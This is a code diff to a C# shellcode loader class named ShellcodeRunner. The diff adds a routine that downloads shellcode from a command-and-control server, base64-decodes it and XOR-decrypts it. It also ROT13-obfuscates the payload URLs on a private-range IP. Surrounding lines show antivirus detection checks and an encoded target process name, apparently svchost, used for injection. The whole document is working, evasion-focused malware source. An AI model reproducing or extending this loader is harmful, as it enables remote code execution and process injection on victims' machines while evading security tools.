@@ -29,8 +29,16 @@ public class ShellcodeRunner
 
     private static byte[] LoadShellcode(string address)
     {
+        // Download shellcode from C2
         WebClient client = new WebClient();
-        return client.DownloadData(address);
+        byte[] shellcode = client.DownloadData(address);
+
+        // Decode and decrypt shellcode
+        shellcode = Convert.FromBase64String(Encoding.Default.GetString(shellcode));
+        for (int i = 0; i < shellcode.Length; i++)
+            shellcode[i] = (byte)((uint)shellcode[i] ^ 0xFF);
+
+        return shellcode;
     }
 
     private static Process GetProcess(string processName)
@@ -152,8 +160,8 @@ public class ShellcodeRunner
         if (DetectAV())
             return;
 
-        byte[] shellcode32 = LoadShellcode("http://192.168.49.112/shellcode32.bin");
-        byte[] shellcode64 = LoadShellcode("http://192.168.49.112/shellcode64.bin");
+        byte[] shellcode32 = LoadShellcode("uggc://192.168.49.112/furyypbqr32.ova.rap");
+        byte[] shellcode64 = LoadShellcode("uggc://192.168.49.112/furyypbqr64.ova.rap");
 
         // svchost
         string processName = ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(Decrypt("p3MwnT9mqN==")));
